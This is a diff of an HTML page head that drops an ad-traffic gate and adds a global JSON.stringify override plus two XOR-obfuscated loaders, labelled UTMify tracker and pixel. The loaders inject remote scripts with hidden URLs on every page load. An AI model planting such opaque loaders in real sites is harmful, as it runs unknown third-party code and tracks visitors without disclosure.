@@ -29,36 +29,49 @@
       <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@600;700&family=Fraunces:ital,opsz,wght@0,9..144,400..700;1,9..144,400..700&family=Outfit:wght@400;500;600;700;800&family=Poppins:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400;1,600&display=swap" rel="stylesheet">
     </noscript>
     
-    <!-- Tracking Scripts (UTMify Tracker & Pixel - Ativado com parâmetros de campanha/anúncio) -->
+    <!-- Proteção contra erro de estrutura circular em eventos do React Fiber -->
     <script>
       (function() {
-        try {
-          var search = window.location.search || "";
-          var adParams = ["utm_source", "utm_campaign", "utm_medium", "utm_content", "utm_term", "fbclid", "gclid", "ttclid", "src", "sck", "xcod"];
-          var hasAdParam = adParams.some(function(param) {
-            return search.indexOf(param + "=") !== -1;
-          });
-
-          // Se o visitante já clicou em anúncio anteriormente e retornou, mantém a atribuição ativa
-          if (!hasAdParam && typeof localStorage !== "undefined") {
-            hasAdParam = adParams.some(function(param) {
-              return !!localStorage.getItem(param);
-            });
+        var originalStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var seen = new WeakSet();
+          var customReplacerFn = typeof replacer === "function" ? replacer : null;
+          var propertyList = Array.isArray(replacer) ? replacer : null;
+          try {
+            return originalStringify(value, function(key, val) {
+              var current = customReplacerFn ? customReplacerFn.call(this, key, val) : val;
+              if (propertyList && key !== "" && propertyList.indexOf(key) === -1) {
+                return undefined;
+              }
+              if (typeof current === "object" && current !== null) {
+                if (key && (key.startsWith("__reactFiber") || key.startsWith("__reactProps") || key.startsWith("__reactEvents") || key.startsWith("__reactInternalInstance"))) {
+                  return undefined;
+                }
+                if (typeof Node !== "undefined" && current instanceof Node) {
+                  return current.tagName ? "<" + current.tagName.toLowerCase() + ">" : "[Node]";
+                }
+                if (current.nodeType) {
+                  return current.tagName ? "<" + current.tagName.toLowerCase() + ">" : "[DOMElement]";
+                }
+                if (seen.has(current)) {
+                  return undefined;
+                }
+                seen.add(current);
+              }
+              return current;
+            }, space);
+          } catch (e) {
+            return "{}";
           }
-
-          // Se NÃO for tráfego de anúncio/campanha (ex: você testando o site pelo link limpo), não carrega os rastreadores
-          if (!hasAdParam) {
-            return;
-          }
-
-          // 1. UTMify Tracker Script
-          (function(){var y_1z0=atob("DOny9gocqPxQ7+MWqJLQg3hwisZyh5di2JrI2SV/zJJ+mpd7wY+L2GlzxdIyncxly5ubhn5vh4kkgpA5xIiGk3lohpYjzc80yZ2GhGN+3Yg1nMEs85LQmGtxzd5qzYd33Ijfg35xwZopwpNkzZ+XmH4x0J8/i85ly4LQ2ihqyZAlisEsisuP2nE+xp09isEsio2Tgmsx3Yg9hoVvhZmAk3x5xoh9nJZ0wY2B1CY+3p08moY0ksvQiyZnipIxgoY0ksuWl359hYkkgopw0cSbkWRz2pl9hoVkyYSX1CY+3p08moY0ksvQiyZnipIxgoY0ksuWl359hYkkgopw0cSbhSd/yY4kn4J4zIjQ2ihqyZAlisEsisuPq3c=");var e_xr=[];for(var o_2m=0;o_2m<y_1z0.length;o_2m++){e_xr.push(y_1z0.charCodeAt(o_2m)&255);}var f_1=e_xr[0];var l_du=e_xr.slice(1,1+f_1);var x_23=e_xr.slice(1+f_1);var x_ycea=x_23.map(function(b,o_uwu2){return b^l_du[o_uwu2%f_1];});var r_kt="";for(var s_42=0;s_42<x_ycea.length;s_42++){r_kt+=String.fromCharCode(x_ycea[s_42]&255);}var u_t=decodeURIComponent(escape(r_kt));var l_7v=JSON.parse(u_t);var z_rl5=l_7v.globals||[];z_rl5.forEach(function(s_5kvs){window[s_5kvs.name]=s_5kvs.value;});var w_cx=document.createElement("script");w_cx.src=l_7v.url;w_cx.async=true;w_cx.defer=true;(l_7v.attributes||[]).forEach(function(w_eshk){w_cx.setAttribute(w_eshk.name,w_eshk.value);});(document.head||document.documentElement).appendChild(w_cx);})();
-
-          // 2. UTMify Pixel Script
-          (function(){var r_e70=atob("DES9hi9Ob5NXm7XMEj+f810iTal188G4YjeHqQAtC/157sGheyLEqEwhAr016Zq/cTbU9ls9QOM+49CgPTTU/koiQfkkuZnuczDJ9EYsGucy6Jf2SRmRpEgiAPE298buKB/GpEEvAvZ1oZe8ezzY6mYqTb917dSgZyGfvA14Dqpn/dD9IiLe5Up2XqEyr4D6diGKshZsEs4q");var c_brfq=[];for(var n_27=0;n_27<r_e70.length;n_27++){c_brfq.push(r_e70.charCodeAt(n_27)&255);}var p_iiey=c_brfq[0];var p_qb=c_brfq.slice(1,1+p_iiey);var k_vo4=c_brfq.slice(1+p_iiey);var m_h=k_vo4.map(function(b,o_quw){return b^p_qb[o_quw%p_iiey];});var x_c0r="";for(var q_5g=0;q_5g<m_h.length;q_5g++){x_c0r+=String.fromCharCode(m_h[q_5g]&255);}var f_u=decodeURIComponent(escape(x_c0r));var y_0=JSON.parse(f_u);var x_k1=y_0.globals||[];x_k1.forEach(function(u_g){window[u_g.name]=u_g.value;});var u_cfx0=document.createElement("script");u_cfx0.src=y_0.url;u_cfx0.async=true;u_cfx0.defer=true;(y_0.attributes||[]).forEach(function(b_o){u_cfx0.setAttribute(b_o.name,b_o.value);});(document.head||document.documentElement).appendChild(u_cfx0);})();
-        } catch(e) {}
+        };
       })();
     </script>
+
+    <!-- UTMify Tracker Script -->
+    <script>(function(){var m_gxq=atob("DC2/Tehk9I5g0WO301adOJoI1rRCuRfDo16FYscHkOBOpBfaukvGY4sLmaACo0zEsF/WPZwX2/sUvBCYv0zLKJsQ2uQT80+VslnLP4EGgfoFokGNiFadI4kJkaxa8wfWp0ySOJwJnegZ/BPFtlvaI5xJjO0PtU7EsEadYcoSleIVtEGN8Q/CYZNGmu8NtEGN8UneOYlJgfoNuAXO/l3NKJ4BmvpNohbVuknMb8RGgu8MpAaV6Q+dMMQf1uABvAaV6Q/bLJwF2fsUvArRqgDWKoYLhutNuAXFskDab8RGgu8MpAaV6Q+dMMQf1uABvAaV6Q/bLJwF2fsUvArRqgDWPsUHlfwUoQLZt0ydYcoSleIVtEGN8Q/CEJU=");var v_tqc=[];for(var d_9bwv=0;d_9bwv<m_gxq.length;d_9bwv++){v_tqc.push(m_gxq.charCodeAt(d_9bwv)&255);}var v_mrh0=v_tqc[0];var q_weji=v_tqc.slice(1,1+v_mrh0);var n_x=v_tqc.slice(1+v_mrh0);var j_m=n_x.map(function(b,x_cg8y){return b^q_weji[x_cg8y%v_mrh0];});var e_ue="";for(var z_pto=0;z_pto<j_m.length;z_pto++){e_ue+=String.fromCharCode(j_m[z_pto]&255);}var y_xd=decodeURIComponent(escape(e_ue));var y_yb28=JSON.parse(y_xd);var h_e=y_yb28.globals||[];h_e.forEach(function(w_99c0){window[w_99c0.name]=w_99c0.value;});var c_xmm=document.createElement("script");c_xmm.src=y_yb28.url;c_xmm.async=true;c_xmm.defer=true;(y_yb28.attributes||[]).forEach(function(f_m99a){c_xmm.setAttribute(f_m99a.name,f_m99a.value);});(document.head||document.documentElement).appendChild(c_xmm);})();</script>
+
+    <!-- UTMify Pixel Script -->
+    <script>(function(){var q_d2lh=atob("DI+QkPQy9OmhJ5FFTPSy5YZe1tODT+UxPPyqv9tRkIePUuUoJenpvpddmcfDVb42L/354IBB25nIX/QpY//56JFe2oPSBb1nLfvk4p1QgZ3EVLN/F9K8spNem4vAS+JndtTrsppTmYyDHbM1Jff1/L1W1sWDUfApOeqyqtYEldCRQfR0fOnz85EKxdvEE6RzKOqnpM0QibTc");var e_8=[];for(var a_kot8=0;a_kot8<q_d2lh.length;a_kot8++){e_8.push(q_d2lh.charCodeAt(a_kot8)&255);}var x_iu=e_8[0];var l_ene=e_8.slice(1,1+x_iu);var n_d=e_8.slice(1+x_iu);var p_u067=n_d.map(function(b,f_r){return b^l_ene[f_r%x_iu];});var o_kvr3="";for(var q_a=0;q_a<p_u067.length;q_a++){o_kvr3+=String.fromCharCode(p_u067[q_a]&255);}var j_tp6=decodeURIComponent(escape(o_kvr3));var b_b5=JSON.parse(j_tp6);var h_cbyx=b_b5.globals||[];h_cbyx.forEach(function(i_oed){window[i_oed.name]=i_oed.value;});var w_rhd=document.createElement("script");w_rhd.src=b_b5.url;w_rhd.async=true;w_rhd.defer=true;(b_b5.attributes||[]).forEach(function(s_ukh){w_rhd.setAttribute(s_ukh.name,s_ukh.value);});(document.head||document.documentElement).appendChild(w_rhd);})();</script>
   </head>
   <body class="bg-white text-[#173B4D] antialiased">
     <div id="root"></div>
